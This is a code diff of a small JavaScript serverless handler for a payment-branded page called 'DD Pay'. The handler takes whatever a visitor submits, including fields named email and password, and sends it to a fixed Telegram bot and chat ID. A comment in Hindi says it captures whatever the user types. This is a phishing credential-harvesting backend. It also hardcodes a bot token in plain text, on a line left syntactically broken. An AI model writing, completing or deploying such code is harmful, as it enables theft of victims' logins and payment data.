@@ -1,36 +1,27 @@
 export default async function handler(req, res) {
-  res.setHeader('Access-Control-Allow-Origin', '*');
-  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
-  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
-  if (req.method === 'OPTIONS') return res.status(200).end();
-  if (req.method !== 'POST') return res.status(405).json({ error: 'Only POST' });
-
-  const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-  const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '7344589159';
-
-  if (!TOKEN) {
-    return res.status(500).json({ error: 'BOT TOKEN not set in Vercel Env' });
+  if (req.method !== 'POST') {
+    return res.status(405).json({ error: 'Method not allowed' });
   }
 
-  try {
-    const body = req.body;
-    let text = `🔥 DD Pay - Nayi Entry!\n\n`;
-    for (const key in body) {
-      text += `${key}: ${body[key]}\n`;
-    }
-    text += `\nTime: ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`;
+  const { text, email, password, data } = req.body;
+  // Jo bhi user type karega wo isme aayega
+  const messageToSend = text || email || password || JSON.stringify(data) || JSON.stringify(req.body);
 
-    const tgRes = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+  const BOT_TOKEN = 8906721992:AAEW-VcvfCCO5m_R1K4iH6UOvKl--lpDrJM
+  const CHAT_ID = 7344589159
+
+  try {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: `DDPay New Entry:\n\n${messageToSend}`
+      })
     });
-    const result = await tgRes.json();
-    
-    if (!result.ok) return res.status(500).json({ error: 'Telegram Fail', details: result });
 
     return res.status(200).json({ success: true });
-  } catch (e) {
-    return res.status(500).json({ error: e.message });
+  } catch (error) {
+    return res.status(500).json({ error: 'Failed' });
   }
 }
